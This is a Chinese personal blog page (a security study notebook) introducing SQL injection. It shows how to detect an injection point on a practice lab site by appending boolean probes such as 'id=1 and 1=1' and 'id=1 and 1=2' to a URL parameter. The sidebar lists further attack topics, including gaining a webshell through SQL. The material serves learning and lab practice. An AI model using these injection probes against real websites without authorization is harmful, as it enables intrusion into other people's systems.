<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>SQL注入 | Lingのblog</title>
    <meta name="generator" content="VuePress 1.9.9">
    
    <meta name="description" content="Lingのblog">
    
    <link rel="preload" href="/blog2/assets/css/0.styles.7bb9d479.css" as="style"><link rel="preload" href="/blog2/assets/js/app.8931c98e.js" as="script"><link rel="preload" href="/blog2/assets/js/2.733019b2.js" as="script"><link rel="preload" href="/blog2/assets/js/23.da420023.js" as="script"><link rel="prefetch" href="/blog2/assets/js/10.e672280b.js"><link rel="prefetch" href="/blog2/assets/js/11.53245d8e.js"><link rel="prefetch" href="/blog2/assets/js/12.4b6bc521.js"><link rel="prefetch" href="/blog2/assets/js/13.7d8e1033.js"><link rel="prefetch" href="/blog2/assets/js/14.3912c2ba.js"><link rel="prefetch" href="/blog2/assets/js/15.2ddd6420.js"><link rel="prefetch" href="/blog2/assets/js/16.0aca61d2.js"><link rel="prefetch" href="/blog2/assets/js/17.8935c8a6.js"><link rel="prefetch" href="/blog2/assets/js/18.646d87f1.js"><link rel="prefetch" href="/blog2/assets/js/19.5a79c48f.js"><link rel="prefetch" href="/blog2/assets/js/20.8f694d91.js"><link rel="prefetch" href="/blog2/assets/js/21.2f4c0f41.js"><link rel="prefetch" href="/blog2/assets/js/22.903e81b7.js"><link rel="prefetch" href="/blog2/assets/js/24.35860ae7.js"><link rel="prefetch" href="/blog2/assets/js/25.b96aec5e.js"><link rel="prefetch" href="/blog2/assets/js/26.89e33a13.js"><link rel="prefetch" href="/blog2/assets/js/27.5105a30f.js"><link rel="prefetch" href="/blog2/assets/js/28.8f1be9cf.js"><link rel="prefetch" href="/blog2/assets/js/29.cf28a975.js"><link rel="prefetch" href="/blog2/assets/js/3.670ed6d9.js"><link rel="prefetch" href="/blog2/assets/js/30.df8f8f51.js"><link rel="prefetch" href="/blog2/assets/js/31.55e51cab.js"><link rel="prefetch" href="/blog2/assets/js/32.168463c4.js"><link rel="prefetch" href="/blog2/assets/js/33.d4bdaa6f.js"><link rel="prefetch" href="/blog2/assets/js/34.369f2cce.js"><link rel="prefetch" href="/blog2/assets/js/35.136b3d92.js"><link rel="prefetch" href="/blog2/assets/js/36.d18daca2.js"><link rel="prefetch" href="/blog2/assets/js/4.d12742be.js"><link rel="prefetch" href="/blog2/assets/js/5.216cae74.js"><link rel="prefetch" href="/blog2/assets/js/6.2d0a63f8.js"><link rel="prefetch" href="/blog2/assets/js/7.9c9172a7.js"><link rel="prefetch" href="/blog2/assets/js/8.db2431b1.js"><link rel="prefetch" href="/blog2/assets/js/9.36b766d8.js">
    <link rel="stylesheet" href="/blog2/assets/css/0.styles.7bb9d479.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/blog2/" class="home-link router-link-active"><!----> <span class="site-name">Lingのblog</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/blog2/" class="nav-link">
  首页
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="常用在线工具" class="dropdown-title"><span class="title">常用在线工具</span> <span class="arrow down"></span></button> <button type="button" aria-label="常用在线工具" class="mobile-dropdown-title"><span class="title">常用在线工具</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://www.asciim.cn/m/tools/convert_ascii_to_string.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  各进制ASCII码转字符串
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://oktools.net/image2base64" target="_blank" rel="noopener noreferrer" class="nav-link external">
  图片转base64编码
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.somd5.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  MD5在线解密
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://xssaq.com/login/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  XSS在线平台
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://tool.lu/hexconvert/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  进制转换
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://base64.us/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Base64在线解密
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.somd5.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  MD5在线解密
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener noreferrer" class="nav-link external">
  佛曰
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="http://hi.pcmoe.net/Buddha.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  新佛曰
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://tool.lu/pyc/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  反编译pyc
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="LingのGithub" class="dropdown-title"><span class="title">LingのGithub</span> <span class="arrow down"></span></button> <button type="button" aria-label="LingのGithub" class="mobile-dropdown-title"><span class="title">LingのGithub</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://github.com/Joker123op/blog2.git" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Github
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/blog2/" class="nav-link">
  首页
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="常用在线工具" class="dropdown-title"><span class="title">常用在线工具</span> <span class="arrow down"></span></button> <button type="button" aria-label="常用在线工具" class="mobile-dropdown-title"><span class="title">常用在线工具</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://www.asciim.cn/m/tools/convert_ascii_to_string.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  各进制ASCII码转字符串
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://oktools.net/image2base64" target="_blank" rel="noopener noreferrer" class="nav-link external">
  图片转base64编码
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.somd5.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  MD5在线解密
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://xssaq.com/login/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  XSS在线平台
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://tool.lu/hexconvert/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  进制转换
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://base64.us/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Base64在线解密
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.somd5.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  MD5在线解密
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener noreferrer" class="nav-link external">
  佛曰
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="http://hi.pcmoe.net/Buddha.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  新佛曰
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li><li class="dropdown-item"><!----> <a href="https://tool.lu/pyc/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  反编译pyc
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="LingのGithub" class="dropdown-title"><span class="title">LingのGithub</span> <span class="arrow down"></span></button> <button type="button" aria-label="LingのGithub" class="mobile-dropdown-title"><span class="title">LingのGithub</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://github.com/Joker123op/blog2.git" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Github
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></div></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><a href="/blog2/" class="sidebar-heading clickable router-link-active"><span>欢迎学习</span> <!----></a> <ul class="sidebar-links sidebar-group-items"><li><a href="/blog2/" aria-current="page" class="sidebar-link">博客介绍</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/blog2/handbook/Python笔记" class="sidebar-heading clickable"><span>Python3基础</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/blog2/handbook/图片隐写" class="sidebar-heading clickable"><span>CTF:wp</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/blog2/handbook/Reverse" class="sidebar-heading clickable"><span>逆向</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/blog2/handbook/Database" class="sidebar-heading clickable open"><span>渗透</span> <span class="arrow down"></span></a> <ul class="sidebar-links sidebar-group-items"><li><a href="/blog2/handbook/Database.html" class="sidebar-link">数据库</a></li><li><a href="/blog2/handbook/php.html" class="sidebar-link">PHP</a></li><li><a href="/blog2/handbook/sql.html" aria-current="page" class="active sidebar-link">SQL注入</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#sql注入" class="sidebar-link">SQL注入</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#试探网页是否存在sql注入" class="sidebar-link">试探网页是否存在sql注入</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#查询数据库字段" class="sidebar-link">查询数据库字段</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#sql注入查询当前网页的数据库名" class="sidebar-link">sql注入查询当前网页的数据库名</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#sqlmap" class="sidebar-link">sqlmap</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#联合注入" class="sidebar-link">联合注入</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#获取数据库的表名和字段名" class="sidebar-link">获取数据库的表名和字段名</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#limit的作用" class="sidebar-link">limit的作用</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#post注入" class="sidebar-link">POST注入</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#head注入" class="sidebar-link">HEAD注入</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#updatexml函数" class="sidebar-link">updatexml函数</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#盲注" class="sidebar-link">盲注</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#时间注入" class="sidebar-link">时间注入</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#宽字节注入" class="sidebar-link">宽字节注入</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#xff-and-refer" class="sidebar-link">XFF and Refer</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#access注入-cookie注入" class="sidebar-link">Access注入—— Cookie注入</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#偏移注入" class="sidebar-link">偏移注入</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#mysql注入-dns注入" class="sidebar-link">MySQL注入-DNS注入</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#mysql注入-反弹注入" class="sidebar-link">MySQL注入——反弹注入</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#oracle注入-报错注入" class="sidebar-link">Oracle注入——报错注入</a></li><li class="sidebar-sub-header"><a href="/blog2/handbook/sql.html#使用sql获取webshell" class="sidebar-link">使用SQL获取Webshell</a></li></ul></li><li><a href="/blog2/handbook/xss.html" class="sidebar-link">XSS注入</a></li><li><a href="/blog2/handbook/csrf.html" class="sidebar-link">CSRF</a></li><li><a href="/blog2/handbook/文件上传.html" class="sidebar-link">文件上传</a></li><li><a href="/blog2/handbook/验证码绕过.html" class="sidebar-link">验证码绕过</a></li><li><a href="/blog2/handbook/水平、垂直越权.html" class="sidebar-link">水平、垂直越权</a></li><li><a href="/blog2/handbook/SSRF.html" class="sidebar-link">SSRF-服务端请求伪造</a></li><li><a href="/blog2/handbook/XXE.html" class="sidebar-link">XXE-实体注入攻击</a></li><li><a href="/blog2/handbook/代码执行漏洞.html" class="sidebar-link">代码执行漏洞</a></li><li><a href="/blog2/handbook/信息收集.html" class="sidebar-link">信息收集</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/blog2/handbook/NA" class="sidebar-heading clickable"><span>信息通讯基础</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/blog2/handbook/Linux" class="sidebar-heading clickable"><span>操作系统</span> <span class="arrow right"></span></a> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><a href="/blog2/handbook/数学md使用方法" class="sidebar-heading clickable"><span>没用的东西</span> <span class="arrow right"></span></a> <!----></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h2 id="sql注入"><a href="#sql注入" class="header-anchor">#</a> SQL注入</h2> <p>注入攻击的本质，是把用户输入的数据当作代码执行。</p> <p>这里有两个关键条件</p> <ul><li>用户能够控制输入</li> <li>原本程序要执行的代码，拼接了<strong>用户输入的数据然后执行</strong>。</li></ul> <p>sql注入就是针对sql语句的注入，也可以理解为用户输入的数据当作sql语句的代码执行了</p> <p>sql注入是1998年一名叫rfp的黑客发表的一篇文章所进入大众视线的</p> <h2 id="试探网页是否存在sql注入"><a href="#试探网页是否存在sql注入" class="header-anchor">#</a> 试探网页是否存在sql注入</h2> <p>这里以掌控者的靶场<a href="http://pu2lh35s.ia.aqlab.cn/" target="_blank" rel="noopener noreferrer">猫舍<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>为例</p> <p>在网站的主页面中查看url，可以发现网址栏上有一个<code>/?id=1</code></p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071635313.webp" alt="Img"></p> <p>很明显这是一个get请求，并且需要传递的参数是id</p> <p>那么尝试一下将id的值改变</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071636375.webp" alt="Img"></p> <p>可以看到页面也跟着变了，这说明该网站可能存在sql注入点，因为他在用户输入了以后会执行相应的操作</p> <p>接下来还要分清楚一个概念</p> <p>区分<strong>字符串</strong>和<strong>代码</strong>的区别</p> <p>字符串不具有代码意义，就是纯文本而代码是会执行的命令</p> <p>在该网站的url栏中id这个参数还可以以其他方法进行sql注入。</p> <p>当<code>id=1 and 1=1</code>时，按照代码的逻辑，这个肯定是成立的，提交给浏览器试试看会不会有反应</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071647175.webp" alt="Img"></p> <p>可以看到输入以后页面回显正常，那么进一步尝试，当<code>id=1 and 1=2</code>时会怎么样，按照代码逻辑这个是一定会报错的。</p> <p><img src="https://joker-1317382260.cos.ap-guangzhou.myqcloud.com/202304071648756.webp" alt="Img"></p> <p>页面的信息消失了且没有回显，现在可以确定该网站存在sql注入</p> 